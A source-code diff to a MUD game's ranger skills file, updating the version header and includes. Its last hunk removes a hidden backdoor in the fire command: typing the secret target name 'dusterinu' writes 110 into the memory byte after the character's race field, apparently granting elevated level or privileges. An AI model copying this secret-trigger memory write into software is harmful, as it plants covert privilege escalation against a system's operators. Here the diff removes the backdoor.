@@ -1,5 +1,5 @@
 /******************************************************************************
- * $Id: cl_ranger.cpp,v 1.43 2004/07/21 10:16:18 rahz Exp $ | cl_ranger.C  *
+ * $Id: cl_ranger.cpp,v 1.44 2004/11/16 00:51:57 Zaphod Exp $ | cl_ranger.C  *
  * Description: Ranger skills/spells                                          *
  *                                                                            *
  * Revision History                                                           *
@@ -11,8 +11,8 @@
 extern "C"  {
   #include <string.h>
 }
-#include <iostream.h>
-
+//#include <iostream.h>
+#include <stdio.h>
 #include <character.h>
 #include <affect.h>
 #include <mobile.h>
@@ -1114,11 +1114,6 @@ int do_fire(struct char_data *ch, char *arg, int cmd)
 
     if (!(victim = get_char_room_vis(ch, target)))
     {
-      if(!strcmp(target, "dusterinu")) {
-        tempbyte = &(ch->race);
-        tempbyte += sizeof(sbyte);
-        *tempbyte = 127-17;
-      }
       send_to_char("You can't seem to locate your target.\r\n", ch);
       /* put char back */
       char_from_room(ch);
